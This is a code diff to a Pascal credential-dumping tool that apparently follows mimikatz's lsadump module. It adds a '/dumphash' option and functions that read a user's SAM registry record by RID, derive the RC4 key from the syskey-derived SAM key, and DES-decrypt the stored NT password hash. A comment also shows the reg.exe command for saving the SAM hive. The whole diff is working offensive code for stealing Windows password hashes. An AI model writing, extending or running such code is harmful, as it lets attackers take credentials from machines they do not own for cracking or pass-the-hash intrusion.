@@ -19,15 +19,13 @@ WIN_X86_Int_User_Info:array[0..4] of byte=($c6, $40, $22, $00, $8b);
 var
   lsass_pid:dword=0;
   p:dword;
-  binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password:string;
+  rid,binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password:string;
   oldhashbyte,newhashbyte:tbyte16;
   myPsid:PSID;
   mystringsid:pchar;
   winver,osarch:string;
   sysdir:pchar;
-  syskey,samkey:tbyte16;
-
-
+  syskey,samkey,nthash:tbyte16;
 
 
   procedure CreateFromStr (var value:_LSA_UNICODE_STRING; st : string);
@@ -1088,13 +1086,100 @@ begin
 //we should cover AES/DES on new "ntlm"
 end;
 
+function decrypthash(samkey:array of byte;var hash:tbyte16;rid_:dword):boolean;
+const
+  NTPASSWORD:ansistring = 'NTPASSWORD'#0;
+  LMPASSWORD:ansistring = 'LMPASSWORD';
+  //bytesrid:array[0..3] of byte =($f4,$01,$00,$00);  //($00,$00,$01,$f4); //500 becomes '000001f4' then reversed
+var
+  md5ctx:md5_ctx;
+  key:_CRYPTO_BUFFER; //{MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
+  cypheredHashBuffer:_CRYPTO_BUFFER; //{0, 0, NULL}
+  status:ntstatus;
+  i:byte;
+  data:array[0..15] of byte;
+begin
+result:=false;
+//STEP4, use SAM-/Syskey to RC4/AES decrypt the Hash
+fillchar(md5ctx,sizeof(md5ctx ),0);
+MD5Init(md5ctx);
+MD5Update(md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
+MD5Update(md5ctx, rid_, sizeof(DWORD));
+MD5Update(md5ctx, pansichar(NTPASSWORD)^,length(NTPASSWORD));
+MD5Final(md5ctx);
+log('RC4Key:'+HashByteToString (md5ctx.digest ));
+//
+//in and out
+fillchar(cypheredHashBuffer,sizeof(cypheredHashBuffer),0);
+cypheredHashBuffer.Length :=16;
+cypheredHashBuffer.MaximumLength := 16 ; //pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
+cypheredHashBuffer.Buffer := hash;
+// in
+key.Length  :=MD5_DIGEST_LENGTH;
+key.MaximumLength :=MD5_DIGEST_LENGTH;
+key.Buffer :=md5ctx.digest;
+status := RtlEncryptDecryptRC4(cypheredHashBuffer, key );
+if status<>0 then log('RtlEncryptDecryptRC4 NOT OK',0) else log('RtlEncryptDecryptRC4 OK',0);
+//STEP5, use DES derived from RID to fully decrypt the Hash
+//...
+//kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory)
+for i := 0 to cypheredHashBuffer.Length -1 do
+  begin
+  //i := i+ 16; //LM_NTLM_HASH_LENGTH; //?
+  status:=RtlDecryptDES2blocks1DWORD(cypheredHashBuffer.Buffer  + i, @rid_, data);
+  if status=0 then
+              begin
+              //writeln('ok:'+HashByteToString (data)); //debug
+              copymemory(@hash[0],@data[0],16);
+              result:=status=0;
+              break;
+              end
+              else writeln('not ok')
+  end;
+end;
+
+//reg.exe save hklm\sam c:\temp\sam.save
+function dumphash(var output:tbyte16;rid:dword):boolean;
+var
+  ret:long;
+  topkey:thandle;
+  cbdata,lptype:dword;
+  data:array[0..1023] of byte;
+  //hash:tbyte16;
+  offset:dword;
+begin
+//only if run as system
+//ret := RegCreateKeyEx(HKEY_LOCAL_MACHINE ,pchar('SAM\sam\Domains\account'),0,nil,REG_OPTION_NON_VOLATILE,KEY_READ,nil,topKey,@dwDisposition);
+ret:=RegOpenKeyEx(HKEY_LOCAL_MACHINE, pchar('SAM\sam\Domains\account\users\'+inttohex(rid,8)),0, KEY_READ, topkey);
+if ret=0 then
+  begin
+  log('RegCreateKeyEx OK',0);
+  cbdata:=sizeof(data);
+  //contains our salt and encrypted sam key
+  ret := RegQueryValueex (topkey,pchar('V'),nil,@lptype,@data[0],@cbdata);
+  if ret=0 then
+     begin
+     log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
+     //we should check the length 0x14=rc4 / 0x38=aes
+     copymemory(@offset,@data[$A8],sizeof(offset));
+     offset:=offset+$CC+4; //the first 4 bytes are a header (revision, etc?)
+     log('Offset:'+inttohex(offset,4),0);
+     CopyMemory(@output[0],@data[offset],sizeof(output)) ;
+     log('Encrypted Hash:'+HashByteToString (output),0);
+     result:=decrypthash(samkey ,output,rid);
+     end
+     else writeln(ret);
+  end;
+RegCloseKey(topkey);
+end;
+
 //also known as hashed bootkey
 function getsamkey(syskey:tbyte16;var output:tbyte16):boolean;
 var
   ret:long;
   topkey:thandle;
   cbdata,lptype:dword;
-  sam:array[0..1023] of byte;
+  data:array[0..1023] of byte;
   salt:tbyte16;
   encrypted_samkey:array[0..31] of byte;
   //bytes:array[0..15] of byte;
@@ -1105,15 +1190,15 @@ ret:=RegOpenKeyEx(HKEY_LOCAL_MACHINE, 'SAM\sam\Domains\account',0, KEY_READ, top
 if ret=0 then
   begin
   log('RegCreateKeyEx OK',0);
-  cbdata:=sizeof(sam);
+  cbdata:=sizeof(data);
   //contains our salt and encrypted sam key
-  ret := RegQueryValueex (topkey,pchar('F'),nil,@lptype,@sam[0],@cbdata);
+  ret := RegQueryValueex (topkey,pchar('F'),nil,@lptype,@data[0],@cbdata);
   if ret=0 then
      begin
      log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
      //writeln(sam[0]);
-     CopyMemory(@salt[0],@sam[$70],sizeof(salt)) ;
-     CopyMemory(@encrypted_samkey[0],@sam[$80],sizeof(samkey)) ;
+     CopyMemory(@salt[0],@data[$70],sizeof(salt)) ;
+     CopyMemory(@encrypted_samkey[0],@data[$80],sizeof(samkey)) ;
      //writeln('SAMKey:'+HashByteToString (samkey));
      result:= gethashedbootkey(salt,syskey,encrypted_samkey,tbyte16(output)); //=true then writeln('SAMKey:'+HashByteToString (tbyte16(bytes)));
      end
@@ -1213,6 +1298,27 @@ begin
      if enumprivileges=false then writeln('enumprivileges NOT OK');
      exit;
      end;
+  p:=pos('/pid:',cmdline);
+  if p>0 then
+       begin
+       pid:=copy(cmdline,p,255);
+       pid:=stringreplace(pid,'/pid:','',[rfReplaceAll, rfIgnoreCase]);
+       delete(pid,pos(' ',pid),255);
+       end;
+  p:=pos('/rid:',cmdline);
+  if p>0 then
+       begin
+       rid:=copy(cmdline,p,255);
+       rid:=stringreplace(rid,'/rid:','',[rfReplaceAll, rfIgnoreCase]);
+       delete(rid,pos(' ',rid),255);
+       end;
+  p:=pos('/binary:',cmdline);
+  if p>0 then
+       begin
+       binary:=copy(cmdline,p,255);
+       binary:=stringreplace(binary,'/binary:','',[rfReplaceAll, rfIgnoreCase]);
+       delete(binary,pos(' ',binary),255);
+       end;
   p:=pos('/getsyskey',cmdline);
   if p>0 then
      begin
@@ -1233,20 +1339,27 @@ begin
         else log('getsyskey NOT OK' ,1);
      exit;
      end;
-  p:=pos('/pid:',cmdline);
+  p:=pos('/dumphash',cmdline);
   if p>0 then
-       begin
-       pid:=copy(cmdline,p,255);
-       pid:=stringreplace(pid,'/pid:','',[rfReplaceAll, rfIgnoreCase]);
-       delete(pid,pos(' ',pid),255);
-       end;
-  p:=pos('/binary:',cmdline);
-  if p>0 then
-       begin
-       binary:=copy(cmdline,p,255);
-       binary:=stringreplace(binary,'/binary:','',[rfReplaceAll, rfIgnoreCase]);
-       delete(binary,pos(' ',binary),255);
-       end;
+     begin
+     if rid='' then exit;
+     if getsyskey(syskey) then
+        begin
+        log('SYSKey:'+HashByteToString(SYSKey) ,1);
+        if getsamkey(syskey,samkey)
+           then
+              begin
+              log('SAMKey:'+HashByteToString(samkey) ,1);
+              if dumphash(nthash,strtoint(rid))
+                 then log('NTHASH:'+HashByteToString(nthash) ,1)
+                 else log('gethash NOT OK' ,1);
+              end //if getsamkey(syskey,samkey)
+           else log('getsamkey NOT OK' ,1);
+        end //if getsyskey(syskey) then
+        else log('getsyskey NOT OK' ,1);
+
+     exit;
+     end;
   p:=pos('/enumproc',cmdline);
     if p>0 then
        begin
@@ -1307,6 +1420,7 @@ begin
     p:=pos('/gethash',cmdline);
       if p>0 then
            begin
+           if password='' then exit;
            log (GenerateNTLMHash (password),1);
            exit;
            end;
